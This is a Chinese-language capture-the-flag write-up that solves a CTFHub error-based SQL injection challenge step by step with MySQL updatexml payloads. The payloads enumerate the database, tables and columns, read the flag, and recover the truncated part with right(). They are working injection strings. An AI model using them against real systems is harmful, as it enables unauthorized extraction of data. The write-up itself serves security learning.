# SQL报错注入

> 例题链接：[CTFHUB报错注入](https://www.ctfhub.com/#/skilltree)

我将以一道例题来描述报错注入的解题方法，链接戳上面

**开始做题**

<img src="../../../statics\img\CTF\16.png" style="zoom:80%;" />

首先按要求输入一个1试一下，发现有回显，而且查询语句都看到了，可以知道这是整数型的注入，因此我们就不需要考虑引号的处理

**报错注入**

输入以下语句查询数据库

```
1 and updatexml(1, concat(0x7e, (select database()), 0x7e), 1)
```

这里解释一下，`updatexml`包含三个参数，其中第二个参数如果包含特殊字符的话，将会触发SQL语法错误，但SQL语句还是会执行，因此我们在第二个参数的查询两边拼接上`0x7e`，也就是`~`，构造错误，骗出服务器的信息

<img src="../../../statics\img\CTF\17.png" style="zoom:80%;" />

查询表

```
1 and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x7e), 1)
```

<img src="../../../statics\img\CTF\18.png" style="zoom:80%;" />

查字段

```
1 and updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag'), 0x7e), 1)
```

<img src="../../../statics\img\CTF\19.png" style="zoom:80%;" />

查内容咯

```
1 and updatexml(1, concat(0x7e, (select flag from flag), 0x7e), 1)
```

<img src="../../../statics\img\CTF\20.png" style="zoom:80%;" />

细心的你会发现，我们在两端注入了`~`但是右边的消失了，说明这个flag没有显示全，可不能随便提交，所以我们查看下右边

```
1 and updatexml(1, concat(0x7e, (select right(flag, 25) from flag), 0x7e), 1)
```

<img src="../../../statics\img\CTF\21.png" style="zoom:80%;" />

ok，拼接一下就可以了